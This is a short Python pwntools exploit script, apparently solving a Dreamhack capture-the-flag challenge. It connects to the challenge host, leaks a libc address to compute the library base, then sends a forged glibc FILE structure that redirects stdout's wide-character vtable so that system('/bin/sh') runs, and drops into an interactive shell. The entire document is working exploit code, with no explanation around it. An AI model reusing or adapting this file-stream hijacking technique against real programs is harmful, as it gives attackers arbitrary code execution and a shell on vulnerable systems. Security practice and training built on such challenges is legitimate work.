#!/usr/bin/env python3

from pwn import *

exe = ELF("./prob_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe
p = remote('host3.dreamhack.games', 22064)


bss_start = p.recvline()
bss_start = bss_start.split(b'\n')[0]
bss_start = int(bss_start, 16)
print(f"bss_start: {(hex(bss_start))}")
libc_base = bss_start - libc.sym['_IO_2_1_stdout_']
print(f"libc_base: {(hex(libc_base))}")


stdout_lock = libc_base + 0x21BA70


stdout = libc_base + libc.sym['_IO_2_1_stdout_']
fake_vtable = libc_base + libc.sym['_IO_wfile_jumps']-0x18


gadget = libc_base + 0x163830


fake = FileStructure(0)
fake.flags = 0x3b01010101010101
fake._IO_read_end=libc_base+libc.sym['system']            # the function that we will call: system()
fake._IO_save_base = gadget
fake._IO_write_end=u64(b'/bin/sh\x00')  # will be at rdi+0x10
fake._lock=stdout_lock
fake._codecvt= stdout + 0xb8
fake._wide_data = stdout+0x200          # _wide_data just need to points to empty zone
fake.unknown2=p64(0)*2+p64(stdout+0x20)+p64(0)*3+p64(fake_vtable)
p.sendline(bytes(fake))


p.interactive()
